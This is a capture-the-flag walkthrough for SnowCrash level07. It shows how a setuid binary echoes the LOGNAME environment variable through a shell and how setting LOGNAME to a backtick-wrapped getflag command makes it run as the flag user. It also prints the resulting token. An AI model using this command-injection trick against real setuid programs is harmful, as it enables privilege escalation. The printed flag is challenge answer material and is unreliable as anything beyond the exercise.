# Level07

## Hint

Perhaps running this can help:
```
strings level07
````
You can also use `gdb` if that's your thing.

## Answer

Let's check our current directory:
```
level07@SnowCrash:~$ ll
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*
```

We have an executable file, let's run it first !
```
level07@SnowCrash:~$ ./level07
level07
```

Alright, let's run `strings level07` and see if we find any useful information:
```
level07@SnowCrash:~$ strings level07
[...]
getenv
[...]
LOGNAME
/bin/echo %s
[...]
```

So we found that the `getenv` command is executed, that there is a variable whose value is `LOGNAME` and that the `echo` command is used along with a `%s`. Let's see what our `LOGNAME` is:
```
level07@SnowCrash:~$ echo $LOGNAME
level07
```

Huh, exactly like the executable. Let's modify its value and run it again:
```
level07@SnowCrash:~$ LOGNAME=test
level07@SnowCrash:~$ ./level07
test
```

Perfect ! Now all we have to do is add some backticks to our `LOGNAME` to make it execute our getflag command:
``` 
level07@SnowCrash:~$ LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
